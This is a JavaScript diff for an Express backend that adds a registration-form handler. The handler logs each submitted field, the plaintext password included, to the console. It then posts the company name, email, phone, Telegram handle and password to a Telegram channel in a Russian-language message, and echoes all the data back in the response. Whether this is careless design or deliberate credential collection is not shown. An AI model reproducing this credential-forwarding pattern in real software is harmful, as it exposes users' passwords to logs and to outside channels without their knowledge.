@@ -1,5 +1,6 @@
 const axios = require('axios');
 const Lead = require('../models/lead.model');
+const {sendMessageToChannel} = require("../telegram-bot/telegramBot");
 
 const sendMessageToKommo = async (req, res) => {
     const {
@@ -64,4 +65,30 @@ const sendMessageToKommo = async (req, res) => {
     }
 };
 
-module.exports = { sendMessageToKommo };
+const submitForm = (req, res) => {
+    const formData = req.body;
+
+    console.log('Form Data Received:', formData);
+    console.log('Company Name:', formData.companyName || 'N/A');
+    console.log('Email:', formData.email || 'N/A');
+    console.log('Phone:', formData.phone || 'N/A');
+    console.log('Telegram:', formData.telegram || 'N/A');
+    console.log('Password:', formData.password || 'N/A');
+
+    const message = `🎉 Новая регистрация с вебсайта! 🎉\n\n` +
+        `🏢 Компания: ${formData.companyName || 'N/A'}\n` +
+        `📧 Емейл: ${formData.email || 'N/A'}\n` +
+        `📞 Телефон: ${formData.phone || 'N/A'}\n` +
+        `💬 Телеграм: ${formData.telegram || 'N/A'}\n` +
+        `🔒 Пароль: ${formData.password || 'N/A'}`;
+
+    sendMessageToChannel(message);
+
+    res.status(200).json({
+        message: 'Form submitted successfully!',
+        data: formData,
+    });
+};
+
+
+module.exports = { sendMessageToKommo, submitForm };
